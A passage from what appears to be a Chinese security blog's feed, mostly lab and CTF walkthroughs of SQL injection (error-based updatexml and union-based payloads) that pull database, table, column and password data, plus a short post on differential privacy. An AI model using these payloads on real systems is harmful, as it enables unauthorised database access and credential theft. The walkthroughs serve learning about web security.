sql">UPDATEXML (XML_document, XPath_string, new_value); <br></code></pre></td></tr></table></figure><p>&emsp;&emsp;第一个参数xml_document是xml文档对象的名称，第二个参数xpath_string是xpath格式的字符串，第三个参数new_value,是替换查找到符合条件的数据。这个函数的作用是改变文档中符合条件的结点的值。</p><p>&emsp;&emsp;在注入语句时，可以搭配concat()函数使用，由于concat函数是将结果连成一个字符串的形式，因此不会符合xpath_string的格式，从而出现格式错误，导致相关的数据被爆出。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,database(),0x7e),1))#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/3.png" style="zoom: 67%;" /></center><p>&emsp;&emsp;注入完一看，是error的内容中出现了geek，有戏，成功的将数据库名输出了</p><p>&emsp;</p><h4 id="4-获取数据库表名"><a href="#4-获取数据库表名" class="headerlink" title="4.获取数据库表名"></a>4.获取数据库表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/4.png" style="zoom: 67%;" /></center><p>&emsp;&emsp;成功将表名输出,可以看到表名卫H4rDsq1。</p><p>&emsp;</p><h4 id="5-获取表中的列名"><a href="#5-获取表中的列名" class="headerlink" title="5.获取表中的列名"></a>5.获取表中的列名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">admin<span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>H4rDsq1<span class="hljs-string">&#x27;)),0x7e),1))#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/5.png" style="zoom: 67%;" /></center><p>&emsp;&emsp;成功获取列名，接下来根据列名查找内容</p><p>&emsp;</p><h4 id="6-获取列中的信息"><a href="#6-获取列中的信息" class="headerlink" title="6.获取列中的信息"></a>6.获取列中的信息</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/8.png" style="zoom: 67%;" /></center><p>&emsp;&emsp; 查询列的内容，找到了flag，但显然，是不完全的，所以需要拼接操作。</p><p>&emsp;</p><h4 id="7-显示信息拼接"><a href="#7-显示信息拼接" class="headerlink" title="7.显示信息拼接"></a>7.显示信息拼接</h4><p>&emsp;&emsp;这里使用left()函数和right()函数进行拼接操作</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(right(password,30)))from(H4rDsq1)),0x7e),1))#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/6.png" style="zoom: 67%;" /></center><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(left(password,30)))from(H4rDsq1)),0x7e),1))#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/7.png" style="zoom: 67%;" /></center><h4 id="8-其他-mysql报错注入类型参考网站"><a href="#8-其他-mysql报错注入类型参考网站" class="headerlink" title="8.其他(mysql报错注入类型参考网站)"></a>8.其他(mysql报错注入类型参考网站)</h4><p>&emsp;&emsp; <a href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a></p><p>&emsp;&emsp;<a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html">https://www.cnblogs.com/wocalieshenmegui/p/5917967.html</a></p><p>&emsp; &emsp;  ——通过注入进行DNS请求，从而达到可以回显的目的</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据安全技术前沿研究笔记（三）</title>
    <link href="/2022/08/12/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E4%B9%8B%E5%B7%AE%E5%88%86%E9%9A%90%E7%A7%81/"/>
    <url>/2022/08/12/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E4%B9%8B%E5%B7%AE%E5%88%86%E9%9A%90%E7%A7%81/</url>
    
    <content type="html"><![CDATA[<h1 id="数据安全技术之差分隐私"><a href="#数据安全技术之差分隐私" class="headerlink" title="数据安全技术之差分隐私"></a>数据安全技术之差分隐私</h1><h4 id="1-差分隐私的定义"><a href="#1-差分隐私的定义" class="headerlink" title="1.差分隐私的定义"></a>1.差分隐私的定义</h4><p>&emsp;&emsp;差分隐私技术由于无需假设攻击者能力或知识背景，安全性可通过数学模型证明，作为一种前沿的隐私保护技术受到广泛的关注。它可以确保数据库插入或删除一条记录不会对查询或统计的结果造成显著性的影响</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E4%B9%8B%E5%B7%AE%E5%88%86%E9%9A%90%E7%A7%81/2.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;其中D 和 D′分别指相邻的数据集（差别只有一条建立），函数f是某种操作或算法（比如查询、求平均、总和等），对于输出C，两个数据集输出这样结果的概率几乎是接近的，即两者概率比值小于 e^ε ，那么称为满足 ε −ε隐私。一般来说，通过在查询结果中加入噪声，比如Laplace 类型的噪声，使得查询结果在一定范围内失真，并且保持两个相邻数据库概率分布几乎相同。ε 参数通常被称为隐私预算，ε 越小，两次查询的结果越接近，即隐私保护程度越高。</p><p>&emsp;</p><h4 id="2-通俗解释"><a href="#2-通俗解释" class="headerlink" title="2.通俗解释"></a>2.通俗解释</h4><p>&emsp;&emsp;用通俗的例子来描述，可能会更好了解一些。假设存在一个数据库，这个数据库可以查询到人员的婚恋情况，如果一开始查询到有4个废物单身，只有2个有对象；这时跑来了个“诺”登记自己的婚姻状况，再查数据库发现5个人是单身，所以能够得出结论——“诺”也是废物。（这也就是差分的由来）</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E4%B9%8B%E5%B7%AE%E5%88%86%E9%9A%90%E7%A7%81/1.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;（图片来源与网络哦，不是俺弄的）</p><p>&emsp;&emsp;这里的”诺“作为样本的出现，使得攻击者猜出了他的局部信息，而差分隐私需要做到的就算使得攻击者不会因为新样本的出现而获取到新的信息和内容。它引入了随机噪声，原本的对应属性的数量耶呈现了概率分布的情况，简单而言就算，当你询问“诺”是否单身的时候，他有一定概率讲假话，这样子最大化数据查询的准确性，同时最大限度减少识别其记录的机会。</p><p>注：还没更完，周末咯！！！下班！</p>]]></content>
    
    
    <categories>
      
      <category>五所实习之数据安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>联合查询注入——括号型</title>
    <link href="/2022/08/11/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8B%AC%E5%8F%B7%E5%9E%8B/"/>
    <url>/2022/08/11/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8B%AC%E5%8F%B7%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="联合查询注入——括号型"><a href="#联合查询注入——括号型" class="headerlink" title="联合查询注入——括号型"></a>联合查询注入——括号型</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;在前面的讲述中，我们一直围绕的是SQL注入的联合查询问题作为注入的切入点，这将是最后一个联合查询的例子演示，比赛和其他平台的相关SQL内容会重新开一个类进行讲述，在最后也会来个总结，接下来是报错注入的相关内容了。</p><h4 id="1-查看界面"><a href="#1-查看界面" class="headerlink" title="1.查看界面"></a>1.查看界面</h4><p>&emsp;&emsp;初始界面：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8B%AC%E5%8F%B7%E5%9E%8B/1.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;我们在注入前，需要猜测闭合问题，所以我们可以用最原始的注入去猜测闭合（之前一直忘记提到的），通过闭合的报错得出注入的方式。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;order by 1#</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;报错界面：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8B%AC%E5%8F%B7%E5%9E%8B/2.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看见，SQL的报错含义是指存在）没有闭合，这说明查询的方式是以</p><p><code>变量 = （&#39;xx&#39;）</code>的形式进行传输。</p><p>&emsp;</p><h4 id="2-分析回显行数"><a href="#2-分析回显行数" class="headerlink" title="2.分析回显行数"></a>2.分析回显行数</h4><p>&emsp;&emsp;（由于这次是括号类型的注入，语句会在原有的基础上加入）进行闭合尝试）</p><p>&emsp;&emsp;判断是否有2行：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; ) order by 2 #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8B%AC%E5%8F%B7%E5%9E%8B/3.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;判断是否有3行：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; ) order by 3 #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8B%AC%E5%8F%B7%E5%9E%8B/4.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;从反馈中可以看见，回显行数是2行</p><p>&emsp;</p><h4 id="3-尝试or的注入"><a href="#3-尝试or的注入" class="headerlink" title="3.尝试or的注入"></a>3.尝试or的注入</h4><p>&emsp;&emsp;继续用or的语句注入看看</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;)  or 1=1 #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8B%AC%E5%8F%B7%E5%9E%8B/5.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="4-获取数据库名"><a href="#4-获取数据库名" class="headerlink" title="4.获取数据库名"></a>4.获取数据库名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;) union select database(),user()#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8B%AC%E5%8F%B7%E5%9E%8B/6.jpg" style="zoom:80%;" /></center><h4 id="5-获取表名"><a href="#5-获取表名" class="headerlink" title="5.获取表名"></a>5.获取表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;) union select table_name,table_name from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="hljs-string">&#x27; #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8B%AC%E5%8F%B7%E5%9E%8B/7.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="6-获取表"><a href="#6-获取表" class="headerlink" title="6.获取表"></a>6.获取表</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;) union select 1,column_name from information_schema.columns where table_schema = &#x27;</span>pikachu<span class="hljs-string">&#x27; and TABLE_NAME = &#x27;</span>users<span class="hljs-string">&#x27; #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8B%AC%E5%8F%B7%E5%9E%8B/8.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="7-获取表的内容"><a href="#7-获取表的内容" class="headerlink" title="7.获取表的内容"></a>7.获取表的内容</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;) union select username,password from users#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8B%AC%E5%8F%B7%E5%9E%8B/9.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="8-解码"><a href="#8-解码" class="headerlink" title="8.解码"></a>8.解码</h4><p>&emsp;&emsp;我是懒鬼，不解释了</p><h4 id="9-小总结"><a href="#9-小总结" class="headerlink" title="9.小总结"></a>9.小总结</h4><p>&emsp;&emsp;通过数字类型、字符类型、搜索类型以及括号类型的操作规程，能了解到在联合查询中，我们实现要判断的是有没有注入点，作为可回显的SQL注入类型之一，我们需要找到回显内容的位置，通过预测闭合情况进行注入。</p><p>&emsp;&emsp;在后续的一些SQL题目中，对于联合注入的困难度不仅仅是在闭合当中，对于字符串的过滤等问题也是需要注意的情况。淦就完了！</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>联合查询注入——搜索型</title>
    <link href="/2022/08/10/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%90%9C%E7%B4%A2%E5%9E%8B/"/>
    <url>/2022/08/10/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%90%9C%E7%B4%A2%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="联合查询注入——搜索型"><a href="#联合查询注入——搜索型" class="headerlink" title="联合查询注入——搜索型"></a>联合查询注入——搜索型</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;like语法：”%”匹配任何字符, “like”的意思就是像, “$” 变量。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> username,id <span class="hljs-keyword">from</span> admin <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%$name%&#x27;</span><br></code></pre></td></tr></table></figure><p>&emsp;</p><h4 id="1-查看界面"><a href="#1-查看界面" class="headerlink" title="1.查看界面"></a>1.查看界面</h4><p>&emsp;&emsp;初始界面：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%90%9C%E7%B4%A2%E5%9E%8B/1.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;搜索失败界面：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%90%9C%E7%B4%A2%E5%9E%8B/2.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;搜索成功的界面：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%90%9C%E7%B4%A2%E5%9E%8B/3.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;我们可以在界面中查看到url的内容，并且对输入内容均有反馈，在该类型的输入框中，我们可以直接在输入框中进行注入操作。（依旧可以使用bp进行抓包，但是我依旧是个懒狗）</p><p>&emsp;&emsp;</p><h4 id="2-分析回显行数"><a href="#2-分析回显行数" class="headerlink" title="2.分析回显行数"></a>2.分析回显行数</h4><p>&emsp;&emsp;（由于这次是搜索类型的注入，语句会在原有的基础上加入%进行闭合尝试）</p><p>&emsp;&emsp;判断是否有3行：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">%</span><span class="hljs-string">&#x27; order by 3 #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%90%9C%E7%B4%A2%E5%9E%8B/4.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;判断是否有4行：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">%</span><span class="hljs-string">&#x27; order by 4 #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%90%9C%E7%B4%A2%E5%9E%8B/5.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;从反馈中可以看见，回显行数是3行</p><p>&emsp;</p><h4 id="3-尝试or的注入"><a href="#3-尝试or的注入" class="headerlink" title="3.尝试or的注入"></a>3.尝试or的注入</h4><p>&emsp;&emsp;老规矩，用or的语句注入看看</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">liaoyue<span class="hljs-operator">%</span><span class="hljs-string">&#x27; or 1=1 #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%90%9C%E7%B4%A2%E5%9E%8B/6.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;（为什么要加liaoyue呢，只是想试试是不是加不加都能全部显示出来，真是逆天，还真是）</p><p>&emsp;</p><h4 id="4-获取数据库名"><a href="#4-获取数据库名" class="headerlink" title="4.获取数据库名"></a>4.获取数据库名</h4><p>&emsp;&emsp;开搞开搞，依旧是用union的语句进行联合查询注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">v<span class="hljs-operator">%</span><span class="hljs-string">&#x27; union select database(),user(),3#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%90%9C%E7%B4%A2%E5%9E%8B/7.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;通过查询我们获取到了数据库名为pikaqiu，用户名为root</p><p>&emsp;</p><h4 id="5-获取表名"><a href="#5-获取表名" class="headerlink" title="5.获取表名"></a>5.获取表名</h4><p>&emsp;&emsp;利用查出来的数据库名称 <strong>pikachu</strong> 构建payload查询表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">v<span class="hljs-operator">%</span><span class="hljs-string">&#x27; union select 1,table_name,table_name from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="hljs-string">&#x27; #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%90%9C%E7%B4%A2%E5%9E%8B/8.jpg" style="zoom: 80%;" /></center><p>&emsp;</p><h4 id="6-获取表"><a href="#6-获取表" class="headerlink" title="6.获取表"></a>6.获取表</h4><p>&emsp;查询pikachu这个数据库发现里面有个users表，查看相关内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">gggggggg<span class="hljs-operator">%</span><span class="hljs-string">&#x27; union select 1,2,column_name from information_schema.columns where table_schema = &#x27;</span>pikachu<span class="hljs-string">&#x27; and TABLE_NAME = &#x27;</span>users<span class="hljs-string">&#x27; #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%90%9C%E7%B4%A2%E5%9E%8B/9.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;为什么用ggggggg，因为一大串看烦了</p><p>&emsp;</p><h4 id="7-获取表的内容"><a href="#7-获取表的内容" class="headerlink" title="7.获取表的内容"></a>7.获取表的内容</h4><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs capnproto">gggggggg%&#x27; <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,username,password <span class="hljs-keyword">from</span> users<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%90%9C%E7%B4%A2%E5%9E%8B/10.jpg" style="zoom: 80%;" /></center><p>&emsp;</p><h4 id="8-进行解码"><a href="#8-进行解码" class="headerlink" title="8.进行解码"></a>8.进行解码</h4><p>&emsp;&emsp;（懒，看数字型文章去）</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>联合查询注入——字符型</title>
    <link href="/2022/08/09/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E5%9E%8B/"/>
    <url>/2022/08/09/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="联合查询注入——字符型注入"><a href="#联合查询注入——字符型注入" class="headerlink" title="联合查询注入——字符型注入"></a>联合查询注入——字符型注入</h1><h4 id="1-查看界面"><a href="#1-查看界面" class="headerlink" title="1.查看界面"></a>1.查看界面</h4><p>&emsp;&emsp;初始界面：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E5%9E%8B/2.png" style="zoom:80%;" /></center><p>&emsp;&emsp;查询成功反馈:</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E5%9E%8B/1.png" style="zoom:67%;" /></center><p>&emsp;查询失败反馈：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E5%9E%8B/3.png" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看见，这次是直接在框中进行输入内容，并且对输入内容均有反馈，在该类型的输入框中，我们可以直接在输入框中进行注入操作，当然， 你喜欢用bp也行，反正我是懒狗。</p><p>&emsp;&emsp;（当然，在真实的情况中，我们是不知道查询成功的反馈情况的，所以我们需要通过order语句判断回显行数）</p><p>&emsp;</p><h4 id="2-分析回显行数"><a href="#2-分析回显行数" class="headerlink" title="2.分析回显行数"></a>2.分析回显行数</h4><p>&emsp;&emsp;判断是否有1行：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;order by 1#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E5%9E%8B/4.png" style="zoom:80%;" /></center><p>&emsp;&emsp;判断是否有2行：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;order by 2#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E5%9E%8B/5.png" style="zoom:80%;" /></center><p>&emsp;&emsp;判断是否有3行：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;order by 3#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E5%9E%8B/6.png" style="zoom:80%;" /></center><p>&emsp;&emsp;当判断第3行时，显示回显错误，说明后端数据库传递过来的数据一共回显两行。接下来尝试or的注入</p><p>&emsp;</p><h4 id="3-尝试or的注入"><a href="#3-尝试or的注入" class="headerlink" title="3.尝试or的注入"></a>3.尝试or的注入</h4><p>&emsp;&emsp;尝试让它将用户表所有人的信息查询出来，在后面加上永真的判断注入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;or 1=1 #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E5%9E%8B/7.png" style="zoom: 80%;" /></center><p>&emsp;</p><h4 id="4-获取数据库名"><a href="#4-获取数据库名" class="headerlink" title="4.获取数据库名"></a>4.获取数据库名</h4><p>&emsp;&emsp;接下来尝试用union的语句进行联合查询注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;union select database(),user()#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E5%9E%8B/8.png" style="zoom:80%;" /></center><p>&emsp;&emsp;通过查询我们获取到了数据库名为pikaqiu，用户名为root</p><p>&emsp;</p><h4 id="5-获取表名"><a href="#5-获取表名" class="headerlink" title="5.获取表名"></a>5.获取表名</h4><p>&emsp;&emsp;利用查出来的数据库名称 <strong>pikachu</strong> 构建payload查询表名</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E5%9E%8B/9.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="6-获取表"><a href="#6-获取表" class="headerlink" title="6.获取表"></a>6.获取表</h4><p>&emsp;&emsp;查询pikachu这个数据库发现里面有个users表，查看相关内容:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;union select table_name,column_name from information_schema.columns where table_schema = &#x27;</span>pikachu<span class="hljs-string">&#x27; and TABLE_NAME = &#x27;</span>users<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E5%9E%8B/10.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="7-获取表的内容"><a href="#7-获取表的内容" class="headerlink" title="7.获取表的内容"></a>7.获取表的内容</h4><p>&emsp;&emsp;知道了所属的所有表名，接下由于联合查询要求前后两个SQL语句的列名数要一致，所以这里只能用两个列名进行查询。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;union select username,password from users#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E5%9E%8B/11.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="8-进行解码"><a href="#8-进行解码" class="headerlink" title="8.进行解码"></a>8.进行解码</h4><p>&emsp;&emsp;内容和数字型的结果一样需要解码，可以翻阅上一篇文章看就好，不过多阐述了。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>联合查询注入——数字型</title>
    <link href="/2022/08/08/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/"/>
    <url>/2022/08/08/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/</url>
    
